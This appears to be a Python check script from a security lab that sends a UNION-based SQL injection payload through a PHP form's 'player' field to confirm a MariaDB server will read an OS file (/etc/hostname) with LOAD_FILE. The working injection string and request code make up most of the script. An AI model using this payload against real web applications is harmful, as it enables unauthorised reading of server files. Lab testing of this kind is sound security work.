#!/usr/bin/env python3
"""Validate MariaDB's real FILE privilege using a non-secret OS hostname file."""
import os
import urllib.parse
import urllib.request

expected = os.environ["EXPECTED_TARGET_HOSTNAME"].strip()
assert expected

payload = "' UNION SELECT LOAD_FILE('/etc/hostname')-- -"
req = urllib.request.Request(
    "http://union-target/index.php",
    data=urllib.parse.urlencode({"player": payload}).encode(),
    headers={"Content-Type": "application/x-www-form-urlencoded"},
)
with urllib.request.urlopen(req, timeout=10) as response:
    result = response.read().decode("utf-8", "replace")
assert result.startswith("Sorry, ") and expected in result, (
    "Expected actual MariaDB LOAD_FILE result through the original eligibility POST"
)
print("PASS: database FILE privilege reads actual benign OS file through HTTP SQL query", flush=True)
